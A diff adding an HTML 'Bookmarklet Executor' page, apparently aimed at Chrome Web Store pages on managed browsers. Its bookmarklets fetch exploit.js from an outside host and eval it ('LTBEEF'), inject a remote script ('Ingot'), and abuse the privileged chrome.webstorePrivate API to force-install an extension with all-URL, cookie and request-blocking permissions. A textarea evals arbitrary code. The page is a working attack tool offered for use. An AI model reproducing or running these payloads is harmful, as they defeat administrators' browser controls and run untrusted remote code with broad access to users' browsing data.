@@ -1,0 +1,92 @@
+<head>
+<title>Bookmarklet Executor</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400&amp;display=swap">
+</head>
+<style>
+body {
+color: white;
+background-color: #2e2e31;
+}
+body, button, textarea {
+font-family: "Open Sans", Verdana;
+}
+h1 {
+user-select: none;
+}
+a {
+color: skyblue;
+transition: filter 250ms;
+}
+button {
+margin: 5px;
+padding: 12px 15px;
+color: white;
+background-color: #0F52BA;
+border: none;
+border-radius: 10px;
+font-size: 20px;
+font-weight: bold;
+user-select: none;
+cursor: pointer;
+transition: filter 100ms;
+}
+button:hover {
+filter: brightness(0.85);
+}
+button:active {
+filter: brightness(1.1);
+}
+textarea {
+min-width: 50%;
+max-width: 90%;
+min-height: 250px;
+max-height: 80%;
+margin: 10px;
+padding: 10px;
+color: white;
+background-color: transparent;
+border-radius: 10px;
+outline: none;
+transition: border-color 100ms;
+}
+textarea:focus {
+border-color: white;
+}
+.bookmarklet {
+padding: 10px;
+color: white;
+background-color: gray;
+border-radius: 10px;
+text-decoration: none;
+user-select: none;
+}
+.bookmarklet:hover {
+filter: brightness(0.85);
+}
+</style>
+</head>
+<body>
+<center>
+<h1>Bookmarklet Executor</h1>
+<a class="bookmarklet" id="LTBEEF" href="javascript:fetch('https://compactcow.com/ltbeef/exploit.js').then(data=>{data.text().then(text=>{eval(text)})});">LTBEEF</a>
+<a class="bookmarklet" id="Ingot" href="javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js'; document.body.appendChild(a);}());">Ingot</a>
+<a class="bookmarklet" id="Extension Installer" href="javascript:document.write(&quot;<center><head><h1>Extension Installer</h1></head><h3>Enter the ID, icon, and name of the extension to install.<br>The icon and name can be anything of your choice.</h3><p>Icon<br><input id='icon' placeholder='data:image/png;base64,...'><p>Name<br><input id='name' placeholder='Extension name'><p>ID<br><input id='extension' maxlength='32' placeholder='Extension ID'><p><button id='submit'>Add to Chrome</button></center>\n<style>textarea{border-radius: 25px; margin: 1 auto; margin-center: auto; margin-center: auto; text-align: center; align: center; display: inline-block; height: 400px} body {padding: 13px; font-size: 110%; color: #fff; background-color: #2e2e31; user-select: none;} h1 {text-align: center; font-size: 70px} h2 {text-align:left;font-size:175%} button, pre, select, textarea {border-radius:  21px;  color: white; font-size:15px} h1, h2, h3, h4, button, label, p, select {font-family: Roboto, sans-serif} hr {border: none; border-bottom: 3px solid #fff} input, kbd, pre, textarea {font-family: monospace; border: none} input, select, textarea {background-color: #fff; border-radius: 25px; padding: 13px 17px; border: none} button{ background-color: #0F52BA; padding: 13px 50px; margin: 20 5px 5px 0} input {width: 600px; border-radius: 25px} textarea {white-space: pre; float: center; width: 60%; border-radius: 25px; 0 0 10px;resize: none; background-color: #99edc3; margin-bottom: 15px} pre {border-radius:25; 10px 10px 0; padding: 13px; float: right; margin: 0 0 25px; width: 40%; overflow-y: scroll; word-break: break-all; white-space: pre-line; background-color: #1c8e40} button {border: none; border-radius: 25px; cursor: pointer; transition: filter 250ms} button:hover {filter:brightness(.8)}.gg{background-color: #99edc3} a {color: #99edc3; transition:color 250ms} a:hover {color: #1c8e40}%3C/style%3E %22), document.getElementById(%22submit%22).addEventListener(%22click%22,function() {var empty = document.getElementById(%22extension%22).value; if (empty == %22%22) {alert(%22Enter an extension ID%22);} let icon = document.getElementById(%22icon%22).value; let name = document.getElementById(%22name%22).value; let extension = document.getElementById(%22extension%22).value; chrome.webstorePrivate.beginInstallWithManifest3({esbAllowlist: !0, iconUrl: %22%22 + icon, id: %22%22 + extension, localizedName: %22%22 + name, manifest: '{\n%22update_url%22: %22https://clients2.google.com/service/update2/crx%22,\n\n    %22manifest_version%22: 2,\n    %22content_security_policy%22: %22script-src \'self\'; object-src \'self\';%22,\n    %22minimum_chrome_version%22: %2271.0.0.0%22,\n    %22offline_enabled%22: true,\n    %22content_scripts%22:\n    [\n        {\n            %22js%22: [\n                %22page.js%22,\n                %22content.js%22\n            ],\n            %22matches%22: [ %22file:///*%22, %22http://*/*%22, %22https://*/*%22 ],\n            %22run_at%22: %22document_start%22,\n            %22all_frames%22: true\n        }\n    ],\n    %22browser_action%22: {\n        %22default_icon%22: {\n            %2219%22: %22images/icon_grey19.png%22,\n            %2238%22: %22images/icon_grey38.png%22,\n            %2216%22: %22images/icon_grey16.png%22,\n            %2224%22: %22images/icon_grey24.png%22,\n            %2232%22: %22images/icon_grey32.png%22\n        },\n        %22default_title%22: %22Tampermonkey%22,\n        %22default_popup%22: %22action.html%22\n    },\n    %22icons%22: {\n        %2232%22: %22images/icon.png%22,\n        %2248%22: %22images/icon48.png%22,\n        %22128%22: %22images/icon128.png%22\n    },\n    %22incognito%22: %22split%22,\n    %22name%22: %22Tampermonkey%22,\n    %22short_name%22: %22Tampermonkey%22,\n    %22version%22: %224.18.0%22,\n    %22description%22: %22The world\'s most popular userscript manager%22,\n    %22default_locale%22: %22en%22,\n    %22background%22: {\n       %22page%22: %22background.html%22\n    },\n    %22options_page%22: %22options.html%22,\n    %22options_ui%22: {\n        %22page%22: %22options.html%22,\n        %22chrome_style%22: false,\n        %22open_in_tab%22: true\n    },\n    %22commands%22: {\n        %22toggle-enable%22: {\n            %22description%22: %22Toggle enable state%22\n        },\n        %22open-dashboard%22: {\n            %22description%22: %22Open dashboard%22\n        },\n        %22open-dashboard-with-running-scripts%22: {\n            %22description%22: %22Open dashboard with the current tab\'s URL used as filter%22\n        },\n        %22open-new-script%22: {\n            %22description%22: %22Open new script tab%22\n        }\n    },\n    %22permissions%22: [\n        %22notifications%22,\n        %22unlimitedStorage%22,\n        %22tabs%22,\n        %22idle%22,\n        %22webNavigation%22,\n        %22webRequest%22, %22webRequestBlocking%22,\n        %22storage%22,\n        %22contextMenus%22,\n        %22chrome://favicon/%22,\n        %22clipboardWrite%22,\n        %22cookies%22,\n        %22declarativeContent%22,\n        %22%3Call_urls%3E%22\n    ],\n    %22optional_permissions%22 : [ %22downloads%22 ]\n}\n',        },        function () {          chrome.webstorePrivate.completeInstall(%22%22 + extension, function () {            console.log(arguments);          });        }      );    },    !1  );">Extension Installer</a>
+<p>
+<textarea autofocus="" spellcheck="false" placeholder="javascript:"></textarea>
+<p>
+<button onclick="run();">Run <small>▶</small></button>
+<p title="Special thanks to 3kh0 for his willingness to host this on his domain, although it was unsuccessful.">
+This DNS was set up by <a href="https://github.com/AshtonDavies" target="_blank">Ashton Davies</a>.
+</center>
+<script>
+document.getElementById("kproxy_float_navigation").remove();
+if (location.hostname == "chromewebstore.google.com") {
+document.getElementById("LTBEEF").title = "Incompatible with this webstore domain.";
+document.getElementById("Ingot").title = "Incompatible with this webstore domain.";
+}
+function run() {
+return eval(document.querySelector("textarea").value);
+}
+</script>
+</body>
